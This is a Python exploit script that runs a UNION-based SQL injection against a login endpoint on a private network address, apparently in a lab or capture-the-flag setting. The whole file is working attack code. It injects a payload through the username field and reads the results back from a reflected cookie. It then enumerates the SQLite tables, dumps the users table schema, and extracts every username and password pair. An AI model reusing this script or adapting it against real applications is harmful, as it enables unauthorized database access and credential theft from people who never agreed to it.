import requests

target = "http://192.168.0.28:3000/login"

def exploit_union(sql_query):
    # We found that column 2 (index 1 in 0-based) is reflected in the 'user' cookie.
    # The injection point is 'username'.
    # Payload structure: xxx' UNION SELECT '1', (<query>), '3', '4' -- 
    
    payload = f"xxx' UNION SELECT '1', ({sql_query}), '3', '4' -- "
    data = {
        'username': payload,
        'password': 'password'
    }
    
    try:
        res = requests.post(target, data=data, allow_redirects=False)
        # Extract cookie 'user'
        if 'user' in res.cookies:
            return res.cookies['user']
        else:
            return None
    except Exception as e:
        print(e)
        return None

print("[*] Dumping Table Names...")
# SQLite query for tables: SELECT group_concat(name) FROM sqlite_master WHERE type='table'
tables = exploit_union("SELECT group_concat(name) FROM sqlite_master WHERE type='table'")
print(f"Tables: {tables}")

if tables and 'users' in tables:
    print("\n[*] Dumping Users Table Schema (CREATE Statement)...")
    schema = exploit_union("SELECT sql FROM sqlite_master WHERE type='table' AND name='users'")
    print(f"Schema: {schema}")
    
    # Based on schema, dump data. 
    # If schema is complex, we might need to parse it. 
    # For now, let's assume we can dump 'username, password' or similar.
    # We'll rely on the schema output to decide the next step manually or interactively.


print("\n[*] Dumping User Credentials (username:password)...")
creds = exploit_union("SELECT group_concat(username || ':' || password) FROM users")
print(f"Credentials: {creds}")
